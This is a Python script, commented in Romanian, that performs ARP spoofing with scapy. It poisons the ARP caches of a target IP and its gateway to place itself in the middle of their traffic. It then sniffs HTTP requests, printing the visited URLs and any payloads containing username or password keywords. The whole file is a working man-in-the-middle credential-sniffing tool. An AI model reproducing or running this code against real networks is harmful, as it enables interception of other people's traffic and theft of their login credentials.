import scapy.all as scapy
import time
import sys
import subprocess # te ajuta sa executi comenzi de shell sau bash pentru diferite sisteme de operare
import optparse
import re
import subprocess 
try:
    from scapy.layers import http
    isScrapyLayers = True
except:
    print("Nu este instalat scrapy-layers!!!")
    isScrapyLayers = False

def get_mac(ip):
    arp_request = scapy.ARP(pdst= ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False) # le pun sa mi le ia doar pe cele din lista

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip )# op e ca vreau response si nu request, pdst ip-ul victimei, hwdst - mac victima si psrc - gateway
    scapy.send(packet, verbose = False) # se executa pachetul dupa ce se executa pachetul asta da adresa de mac de aici la gateway-ul din tinta

def restore(dest_ip, source_ip):
    destination_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = dest_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) # daca omitem ultimul parametry o sa se puna automat pe mac-ul tau
    scapy.send(packet,count = 4 , verbose = False)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        host = packet[http.HTTPRequest].Host # dupa ce dau packet show ma uit sa vad care e layer si dupa dau aici
        path = packet[http.HTTPRequest].Path
        url = host + path
        print("Se acceseaza pagina: {}".format(url))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["user", "usr", "username", "usrnm","uname", "email", "login", "name", "password", "pwd","pass","passwd","pasword", "paswd","pswd"]
            for keyword in keywords:
                if keyword in str(load):
                    print("Posibil username sau parola... " + str(load))
                    break

def sniff(interface):
    scapy.sniff(iface=interface,store = False, prn=process_sniffed_packet)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--destination", dest="destination", help="IP-ul tintei") # specificam prima optiune pe care o folosim
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway") # specificam prima optiune pe care o folosim
    parser.add_option("-i", "--interface", dest="interface", help="Interfata pe care o folositi") # specificam prima optiune pe care o folosim
    (option, arguments) = parser.parse_args()
    if not option.interface :
        parser.error("Specifica te rog o interfata!. Foloseste --help pentru mai multe informatii")
    elif not option.gateway:
        parser.error("Specifica te rog un gateway. Foloseste --help pentru mai multe informatii")

    elif not option.destination:
        parser.error("Specifica te rog un ip pentru target!. Foloseste --help pentru mai multe informatii")
    else:
        return option


if not isScrapyLayers:
    userInput    = input("Doriti sa instalati libraria scapy-http? [Da/Nu] ")
    user_answers = ['da', 'Da', 'dA', 'DA']
    for user_answer in user_answers:
        if userInput in user_answer:
            #instaleaza aplicatia 
            subprocess.call(["pip3",  "install", "scapy_http"])
        else:
            exit
else:
    try:
        index = 0
        option = get_arguments()
        dest_ok = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",option.destination)
        gat_ok = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",option.gateway)
        isStartSniff = True
        if (not dest_ok) or (not gat_ok):
            print("Adresa IP sau Interfata nu este valida!")
        elif option.interface is None:
            print("Interfata nu este valida!")
        else: 
            while True:
                #aici se face spoof si se cloneaza adresa sa putem sa fim man in the middle
                spoof(option.destination, option.gateway)
                spoof(option.gateway, option.destination)
                index += 2 
                #print("\r[+] Doua pachete trimise! Au fost trimise {} pachete..".format(index), end = "")
                print("Se trimit pachete...")
                if isStartSniff:
                    isStartSniff = False
                    sniff(option.interface)
                
                time.sleep(2)
    except KeyboardInterrupt: 
        print("Intrerupt de utilizator. Resetare ARP Table va rugam asteptati...")
        restore(option.destination, option.gateway)
        restore(option.gateway , option.destination) # se face restore de 2 ori pentru ca se face si spoof de 2 ori
        isStartSniff = True